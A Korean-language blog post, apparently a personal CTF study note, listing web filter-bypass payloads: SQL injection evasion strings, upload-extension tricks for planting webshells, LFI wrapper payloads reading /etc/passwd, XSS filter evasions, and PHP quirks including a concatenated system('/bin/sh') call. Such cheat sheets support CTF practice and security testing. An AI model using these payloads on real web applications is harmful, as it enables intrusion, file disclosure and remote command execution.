---
layout: post
title: "Web trick(bypass) for CTF "
excerpt: "Try to know trick & use it ~_~"
date: 2020-11-21
categories: [Web]
comments: true 
---

이번에는 ctf를 위한 다양한 웹 트릭 및 우회방법들을 간단하게나마 정리를 해보려고한다. 

<h3>0x0. SQLI bypass </h3>

```
+로 우회  ex)'+or+1=1
/**/주석으로 우회 ex)'/**/or/**/1=1
#주석으로 우회 ex)'#%0aor#%0a1=1
--주석으로 우회
Tab으로 우회 ex)'%09or%091=1
Line Feed로 우회 ex)'%0aor%0a1=1
괄호로 우회 ex)(2)or(1=1)
Carrage Return으로 우회 ex)'%0dor%0d1=1
%0b,%a0,%0c ~~
' > "  ex) " or 1=1
' > \ ex) \ or 1=1 
;00으로 우회
substr > substring으로 변경 / mid로 우회
ascii >  ord나 hex , char, unhex등 이용
= > LIKE등으로 변경
load_file/*test*/(0x~~)
concat() ,alias 이용
uNiOn AlL SeLecT등의 케이스 이용
1+uni*on+sel*ect+1,3--+- 등 특수문자 이용
id=1&id=*/union/*&id=*/select/*&id=*/1,2+--+ HPP 이용
(select 0xAAAAAAAAAAAAAAAA ..... A's) bof를 이용
```



<h3>0x1. File upload bypass</h3>

```
.php > phtml. pHp, php.suspected, .php3, .htm, .php%00.png , .php/, .php.\ 
.asp > .cer, .asa, .cdx, .AsP, .asp%00.jpg
.jsp > .jsw, .jsv, .jspx, .war, .JsP, .jsp%00.png, .js%70, .%22jsp 
.htaccess변조 및 업로드 > AddHandler text/html .php .png 등등
GIF89a; 등을 이용하여 GIF로 위조
이미지 파일에 쉘코드 삽입 등등
gif to xss/csrf 등등 
파일명에 페이로드 삽입 ex) <script>alert(1)</script>.jpg
```



<h3>0x2. LFI bypass</h3>

```
php wrappers > php?page=expect://ls , php://input&cmd=ls , php://filter/convert.base64-encode/resource=/etc/passwd 
zip wrappers > php?page=zip://path/to/file.zip#sh
null byte > php?page=/etc/passwd%00 , page=/etc/passwd%2500
```



<h3>0x3. XSS bypass</h3>

```
javas%09cript:alert , param=test`-alert(1)=`def';
param=test'&&'http://naver.com';
.을 필터링 > document['cookie']
;나 + 필터링 > 'test'-alert(1)-'def'
""를 필터링 > eval[alert(1)]
native function 필터링 > alert;a(1) 
```



<h3>0x4. php trick</h3>

```
== 연산자의 느슨함을 이용한 트릭
```

| ==           | true  | false | 1     | 0     | -1    | "1"   | "0"   | "-1"  | null  | array() | array(1) | array("php") | "php" | ""    | NAN   |
| ------------ | ----- | ----- | ----- | ----- | ----- | ----- | ----- | ----- | ----- | ------- | -------- | ------------ | ----- | ----- | ----- |
| true         | true  | false | true  | false | true  | true  | false | true  | false | false   | true     | true         | true  | false | true  |
| false        | false | true  | false | true  | false | false | true  | false | true  | true    | false    | false        | false | true  | false |
| 1            | true  | false | true  | false | false | true  | false | false | false | false   | false    | false        | false | false | false |
| 0            | false | true  | false | true  | false | false | true  | false | true  | false   | false    | false        | true  | true  | false |
| -1           | true  | false | false | false | true  | false | false | true  | false | false   | false    | false        | false | false | false |
| "1"          | true  | false | true  | false | false | true  | false | false | false | false   | false    | false        | false | false | false |
| "0"          | false | true  | false | true  | false | false | true  | false | false | false   | false    | false        | false | false | false |
| "-1"         | true  | false | false | false | true  | false | false | true  | false | false   | false    | false        | false | false | false |
| null         | false | true  | false | true  | false | false | false | false | true  | true    | false    | false        | false | true  | false |
| array()      | false | true  | false | false | false | false | false | false | true  | true    | false    | false        | false | false | false |
| array(1)     | true  | false | false | false | false | false | false | false | false | false   | true     | false        | false | false | false |
| array("php") | true  | false | false | false | false | false | false | false | false | false   | false    | true         | false | false | false |
| "php"        | true  | false | false | true  | false | false | false | false | false | false   | false    | false        | true  | false | false |
| ""           | false | true  | false | true  | false | false | false | false | true  | false   | false    | false        | false | true  | false |
| NAN          | true  | false | false | false | false | false | false | false | false | false   | false    | false        | false | false | false |

```
magic hash를 이용한 트릭 > 
"0e1354" == "0e87453" // true
"0" == "0e7124511451155" //true
"0" == md5("240610708") // true
"0" == sha1("w9KASOk6Ikap") // true
md5("QLTHNDT") == md5("QNKCDZO") // true

.을 이용한 함수 호출 > "sy"."stem"('/bin/sh');
<? <?php 이외에 php 선언 > <script language='php'>
백쿼터(`)를 이용한 함수 호출 > echo `ls`;를 하면 system('ls')과 같음
17자리가 넘는 두 수를 비교하면 미세한 차이는 무시
함수를 문자열로 호출> "phpinfo();"
아파치는 다중 확장자 가능 >  webshell.php.test는 정상 작동
대괄호 없이 배열에 접근 > ${${$variables{0}}{0}}();등의 형태를 통해서 가능
strip_tags 함수의 트릭 > strip_tags("<a/udio>") >  a 태그로 인식
젠드엔진에 의한 타입 캐스팅
언더바 우회 > __main__같은걸 호출할때 .main. , %20main%20 등으로 우회 가능
system 함수 필터링 > exec(), shell_exec(), passthru() 등으로 웹쉘
parse_url등의 url을 파싱하는 함수> ssrf 등으로 연계 가능
```

계속해서 ctf나 공부를 하면서 얻는 지식들을 정리할 예정